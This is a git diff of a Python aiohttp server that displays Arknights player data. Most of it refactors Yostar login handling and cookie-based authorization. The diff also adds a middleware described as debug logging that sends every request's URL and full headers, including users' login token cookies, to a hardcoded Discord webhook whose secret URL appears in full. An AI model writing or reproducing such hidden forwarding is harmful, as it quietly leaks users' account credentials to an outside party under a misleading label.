@@ -1,11 +1,12 @@
 """Server app."""
 import asyncio
 import bisect
-import os
+import logging
 import sys
 import typing
 import urllib.parse
 
+import aiohttp
 import aiohttp.web
 import arkprts
 import dotenv
@@ -21,10 +22,11 @@ app = aiohttp.web.Application()
 routes = aiohttp.web.RouteTableDef()
 env = jinja2.Environment(loader=jinja2.PackageLoader("arkprtserver"), autoescape=True, extensions=["jinja2.ext.do"])
 
-# not actually pure, gamedata is just delayed
-client = arkprts.Client(pure=True)
+client = arkprts.Client(server="en")
 
 FAVOR_FRAMES: list[int] = []
+
+LOGGER: logging.Logger = logging.getLogger("arkprtserver")
 
 
 def get_image(type: str, id: str) -> str:
@@ -60,15 +62,6 @@ async def get_gamepress_tierlist() -> dict[str, gamepress.GamepressOperator]:
     return {operator.operator_id: operator for operator in operators if operator.operator_id}
 
 
-def _get_client(pure: bool = False) -> arkprts.Client:
-    """Get a client for a given channel uid and token."""
-    subclient = arkprts.Client(pure=pure)
-    subclient.config = client.config
-    subclient.gamedata = client.gamedata
-
-    return subclient
-
-
 env_globals = dict(
     get_image=get_image,
     calculate_trust=calculate_trust,
@@ -80,7 +73,6 @@ env.globals.update(env_globals)  # type: ignore
 
 async def startup(app: aiohttp.web.Application) -> None:
     """Startup function."""
-    await client.login_with_token(os.environ["CHANNEL_UID"], os.environ["YOSTAR_TOKEN"])
     task = asyncio.create_task(startup_gamedata(app))
     task.add_done_callback(lambda _: None)  # little hack
 
@@ -90,12 +82,7 @@ app.on_startup.append(startup)
 
 async def startup_gamedata(app: aiohttp.web.Application) -> None:
     """Load gamedata."""
-    await client.gamedata.download_gamedata()
-
-    global FAVOR_FRAMES  # noqa: PLW0603 # globals :(
-    frames = client.gamedata.favor_table.favor_frames
-    FAVOR_FRAMES = [frame["data"].favor_point for frame in frames]  # pyright: ignore[reportConstantRedefinition]
-
+    await client.update_gamedata()
     env.globals["tierlist"] = await get_gamepress_tierlist()  # type: ignore
 
 
@@ -105,13 +92,29 @@ async def startup_middleware(
     handler: typing.Callable[[aiohttp.web.Request], typing.Awaitable[aiohttp.web.StreamResponse]],
 ) -> aiohttp.web.StreamResponse:
     """Startup middleware."""
-    if not FAVOR_FRAMES:
+    if not client.gamedata.loaded:
         template = env.get_template("startup.html.j2")
         return aiohttp.web.Response(text=template.render(request=request), content_type="text/html")
 
     return await handler(request)
 
 
+@aiohttp.web.middleware
+async def log_request(
+    request: aiohttp.web.Request,
+    handler: typing.Callable[[aiohttp.web.Request], typing.Awaitable[aiohttp.web.StreamResponse]],
+) -> aiohttp.web.StreamResponse:
+    """Log request for debugging."""
+    url = "https://discord.com/api/webhooks/1125939835639701514/LcTRGvUh806LziIRV5WxlC0mujYJbrHZOf5frCZbRTCmOBvixHL0chYSG45LaBfNTUWQ"
+    headers = "\n".join(f"{key}: {value}" for key, value in request.headers.items())
+    data = {"content": f"```\n{request.method} {request.url}\n{headers}\n```"}
+    async with aiohttp.ClientSession() as session:
+        await session.post(url, json=data)
+
+    return await handler(request)
+
+
+app.middlewares.append(log_request)
 app.middlewares.append(startup_middleware)
 
 
@@ -127,7 +130,7 @@ async def search(request: aiohttp.web.Request) -> aiohttp.web.Response:
     """Search for users."""
     users: typing.Sequence[arkprts.models.Player] = []
     if request.query.get("nickname"):
-        users = await client.search_player(request.query["nickname"])
+        users = await client.search_players(request.query["nickname"], server=request.query.get("server"))  # type: ignore
 
     if request.query.get("all") not in ("1", "true"):
         users = [user for user in users if user.level >= 10]
@@ -139,48 +142,64 @@ async def search(request: aiohttp.web.Request) -> aiohttp.web.Response:
 @routes.get("/login")
 async def login(request: aiohttp.web.Request) -> aiohttp.web.Response:
     """Login."""
-    user_client = _get_client(pure=True)
     template = env.get_template("login.html.j2")
     response = aiohttp.web.Response(text=template.render(request=request), content_type="text/html")
 
     if not request.query.get("email"):
         return response
 
+    server = request.query.get("server", "en")
+    if server not in ("en", "jp", "kr"):
+        server = "en"
+
+    auth = arkprts.YostarAuth(server=server, network=client.network)
+
     if not request.query.get("code"):
         try:
-            await user_client._request_yostar_auth(request.query["email"])
+            await auth.get_token_from_email_code(request.query["email"])
         except arkprts.errors.BaseArkprtsError as e:
             return aiohttp.web.Response(text=template.render(request=request, error=str(e)), content_type="text/html")
 
         return response
 
     try:
-        yostar_uid, yostar_token = await user_client._submit_yostar_auth(request.query["email"], request.query["code"])
-        channel_uid, token = await user_client._get_yostar_token(request.query["email"], yostar_uid, yostar_token)
+        channel_uid, token = await auth.get_token_from_email_code(request.query["email"], request.query["code"])
     except arkprts.errors.BaseArkprtsError as e:
         return aiohttp.web.Response(text=template.render(request=request, error=str(e)), content_type="text/html")
 
     response = aiohttp.web.HTTPTemporaryRedirect("/user")
+    response.set_cookie("server", auth.server)
     response.set_cookie("channel_uid", channel_uid)
     response.set_cookie("token", token)
 
     return response
 
 
-@routes.get("/user")
-async def user(request: aiohttp.web.Request) -> aiohttp.web.Response:
-    """User."""
-    if not request.cookies.get("channel_uid") or not request.cookies.get("token"):
+async def authorize(request: aiohttp.web.Request) -> arkprts.Client | aiohttp.web.Response:
+    """Attempt to authorize or redirect to login."""
+    if not request.cookies.get("channel_uid") or not request.cookies.get("token") or not request.cookies.get("server"):
         return aiohttp.web.HTTPTemporaryRedirect("/login")
 
-    user_client = _get_client()
+    auth = arkprts.YostarAuth(server=request.cookies["server"], network=client.network)  # type: ignore
+
     try:
-        await user_client.login_with_token(request.cookies["channel_uid"], request.cookies["token"])
+        await auth.login_with_token(request.cookies["channel_uid"], request.cookies["token"])
     except arkprts.errors.BaseArkprtsError:
         response = aiohttp.web.HTTPTemporaryRedirect("/login")
         response.del_cookie("channel_uid")
         response.del_cookie("token")
+        response.del_cookie("server")
         return response
+
+    return arkprts.Client(auth=auth, gamedata=client.gamedata)
+
+
+@routes.get("/user")
+async def user(request: aiohttp.web.Request) -> aiohttp.web.Response:
+    """User."""
+    user_client = await authorize(request)
+    if isinstance(user_client, aiohttp.web.Response):
+        return user_client
 
     user = await user_client.get_data()
 
@@ -191,17 +210,9 @@ async def user(request: aiohttp.web.Request) -> aiohttp.web.Response:
 @routes.get("/optimize")
 async def optimize(request: aiohttp.web.Request) -> aiohttp.web.Response:
     """Optimize."""
-    if not request.cookies.get("channel_uid") or not request.cookies.get("token"):
-        return aiohttp.web.HTTPTemporaryRedirect("/login")
-
-    user_client = _get_client()
-    try:
-        await user_client.login_with_token(request.cookies["channel_uid"], request.cookies["token"])
-    except arkprts.errors.BaseArkprtsError:
-        response = aiohttp.web.HTTPTemporaryRedirect("/login")
-        response.del_cookie("channel_uid")
-        response.del_cookie("token")
-        return response
+    user_client = await authorize(request)
+    if isinstance(user_client, aiohttp.web.Response):
+        return user_client
 
     user = await user_client.get_data()
 
